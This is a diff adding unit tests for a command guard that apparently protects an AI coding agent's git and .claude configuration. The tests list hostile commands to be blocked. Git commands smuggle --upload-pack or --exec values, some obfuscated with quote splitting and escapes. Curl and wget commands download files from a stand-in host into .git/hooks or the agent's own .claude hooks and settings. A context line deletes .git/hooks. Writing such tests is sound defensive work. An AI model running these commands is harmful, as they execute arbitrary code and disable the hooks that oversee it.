@@ -601,6 +601,84 @@ class BypassGuardTest(unittest.TestCase):
             "EOF\n)\""
         )
 
+    def test_fetch_pack_and_upload_archive_blocked(self):
+        for cmd in ("git fetch-pack --upload-pack=x origin", "git fetch-pack --exec=x origin",
+                    "git-fetch-pack --upload-pack x origin", "git -C . fetch-pack --upl=x origin",
+                    "git upload-archive --exec=x repo", "git -C . upload-archive --exec x repo"):
+            self.blocked(cmd)
+
+    def test_fetch_pack_and_upload_archive_neighbours_allowed(self):
+        for cmd in ("git fetch-pack --all origin", "git fetch-pack --stdin --thin origin",
+                    "git upload-archive repo"):
+            self.allowed(cmd)
+
+    def test_option_hidden_behind_flag_value_blocked(self):
+        # fetch/ls-remote の -t/-m/-b は真偽値の旗 (値を取らない)。直後のクォート値は散文ではなく引数
+        for cmd in ('git fetch origin -t "--upload-pack=x"', "git fetch origin -t '--exec=x'",
+                    'git fetch -m "--upload-pack=x" origin', 'git ls-remote -b "--upload-pack=x" origin',
+                    'git pull origin -t --upload-pack="x"', 'git fetch origin -t "--upl=x" && echo ok',
+                    'git "fetch" origin -t "--upload-pack=x"', 'git f\\etch origin -t "--upload-pack=x"',
+                    'git commit -m "a" && git fetch origin -t "--exec=x"'):
+            self.blocked(cmd)
+
+    def test_option_hidden_behind_flag_value_neighbours_allowed(self):
+        self.allowed('git fetch origin -t "v1.0"')
+        self.allowed('git commit -m "docs: mention --upload-pack"')
+        self.allowed('git commit -m "x"')
+        # 旗の値は旗どうしの間の文だけで判定する (手前の -m の中身や `;` の前の fetch に引きずられない)
+        self.allowed('git commit -m "fix: guard git fetch options" -m "blocks git push origin --exec=x"')
+        self.allowed('git fetch origin; git commit -m "docs: git push origin --exec=x"')
+        self.allowed('gh pr create --title "block git push --exec" --body "git fetch origin --upload-pack=x is blocked"')
+        self.allowed('git fetch origin && git commit -m "docs: git fetch origin --upload-pack=x is blocked"')
+        self.allowed(
+            "git commit -m \"$(cat <<'EOF'\n"
+            "docs: mention --upload-pack\n"
+            "EOF\n)\""
+        )
+
+    def test_quote_split_remote_helper_option_blocked(self):
+        for cmd in ('git push origin --rec"eive-pack=x"', "git fetch origin --'upload-pack'=x",
+                    "git push origin --exec\\=x", 'git fetch origin --"upl"oad-pack x',
+                    'git fetch origin "--upload-pack=x"', 'git clone "-u" x https://example.com/r.git',
+                    "git push origin --e''xec x"):
+            self.blocked(cmd)
+
+    def test_quote_split_remote_helper_option_neighbours_allowed(self):
+        for cmd in ("git fetch origin -- upload-pack", 'git fetch origin -- "upload-pack"',
+                    'git fetch origin "feature x"', 'git push origin "feature/x"',
+                    'git commit -m "x" -q', 'git commit -m "run: a" -m "b: c"'):
+            self.allowed(cmd)
+
+    # --- curl / wget の出力先が保護対象 (.git/ .claude/) ---
+    def test_curl_wget_output_to_protected_path_blocked(self):
+        for cmd in ("curl -sS --max-time 5 -o .claude/hooks/git-destructive-blocker.py -w '%{http_code}' https://x.example/",
+                    "curl -sS --max-time 5 -o ./.git/hooks/pre-commit -w x https://x.example/",
+                    "curl -sSo .claude/settings.json https://x.example/",
+                    "curl --output=.claude/settings.json https://x.example/",
+                    "curl --output .git/config https://x.example/", "curl -o.claude/settings.json https://x.example/",
+                    "curl -sS -o '.claude/hooks/x.py' https://x.example/", 'curl -o "$HOME/.claude/settings.json" https://x.example/',
+                    "curl -O --output-dir .claude/hooks https://x.example/a.py", "/usr/bin/curl -o .git https://x.example/",
+                    "wget -O .claude/settings.json https://x.example/", "wget -qO.git/hooks/pre-push https://x.example/",
+                    "wget --output-document=.git/config https://x.example/", "wget -P .claude/hooks https://x.example/a.py",
+                    "code=$(curl -sS --max-time 5 -o .claude/settings.json -w '%{http_code}' https://x.example/)",
+                    "(curl -sSo .git/hooks/pre-commit https://x.example/)", "curl -sSo .Claude/settings.json https://x.example/",
+                    "curl -sS -w '%output{.claude/settings.json}x' https://x.example/",
+                    "bash -c \"curl -sS -o .claude/settings.json https://x.example/\""):
+            self.blocked(cmd)
+
+    def test_curl_wget_output_elsewhere_allowed(self):
+        for cmd in ("curl -sS --max-time 10 -o /tmp/body.txt -w '%{http_code}' https://x.example/",
+                    "curl -sS --head --max-time 5 -o /dev/null -w '%{http_code} %{content_type}' https://x.example/",
+                    "curl -sS --max-time 10 -o /tmp/b -w x https://x.example/.claude/foo",
+                    "curl -sS https://x.example/.git/config", "curl -sSo /tmp/o.json https://x.example/",
+                    "curl --output=/tmp/o.json https://x.example/", "wget -O /tmp/x https://x.example/.claude/y",
+                    "wget -qO- https://x.example/", "curl -sS -o .github/x.txt https://x.example/",
+                    "curl -sS -o .gitignore.bak https://x.example/", "curl -sS -o my.claude/x https://x.example/",
+                    "code=$(curl -sS --max-time 5 -o /tmp/b -w '%{http_code}' https://x.example/)",
+                    "curl -sS -w '%output{/tmp/o.txt}x' https://x.example/",
+                    'git commit -m "docs: curl -o .claude/settings.json is blocked"'):
+            self.allowed(cmd)
+
     # --- find -delete での .git/hooks 削除 ---
     def test_find_delete_in_git_hooks_blocked(self):
         self.blocked("find .git/hooks -type f -delete")
